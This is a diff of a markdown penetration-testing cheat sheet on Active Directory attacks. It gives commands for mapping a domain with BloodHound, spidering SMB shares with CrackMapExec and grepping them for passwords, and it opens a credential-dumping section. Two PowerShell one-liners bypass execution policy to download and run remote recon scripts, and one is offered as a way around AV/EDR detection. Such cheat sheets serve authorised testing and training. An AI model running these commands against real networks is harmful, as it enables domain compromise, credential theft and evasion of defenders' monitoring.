@@ -1,52 +1,38 @@
 # Active Directory
 
-## AD Mapping
+## Mapping
 
 Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.
-
 ```powershell
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1’);Invoke-BloodHound"
 ```
-
 If it's possible, execute SharpHound. On Linux, you can use the python version. More information here : https://github.com/BloodHoundAD/SharpHound and https://github.com/fox-it/BloodHound.py
 ```bash
 python3 bloodhound.py -u 'XXX' -dc 'DOMAIN' -c all
 ```
-
 The tool give you a zip file, that you have to send to a Neo4j database. On Linux, install Neo4j and start the service :
-
 ```bash
 sudo neo4j start
 ```
 Then execute BloodHound and import the zip file.
-
-## Shares :
-
+## Shares
 Dump all shares via CrackMapExec. This can be used on native Kali distribution :
-
 ```bash
 crackmapexec smb IP_ADDRESS/MASK -u 'XXX' -p 'XXX' -M spider_plus -o READ_ONLY=false
 ```
-
 This command create a directory cme_spider_plus in /tmp (for Linux). To retrive passwords, simply use grep, by using keywords like 'password', 'pass', 'username', 'ldap://', etc ..
 ```bash
 grep -rnw ./ -e 'password'
 ```
-
 If detected by AV/EDR, try PowerShell one-liner PowerView :
-
 ```powershell
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"
 ```
-
 Then, a lot of functionalities can be used. To find all domain shares :
-
 ```powershell
 Find-DomainShare -CheckShareAccess
 ```
-
 All the functionalities here : https://powersploit.readthedocs.io/en/latest/Recon/
-
 ## Dump credentials
 ### CrackMapExec
 Many possibilites. Use --local-auth if using a local admin account.
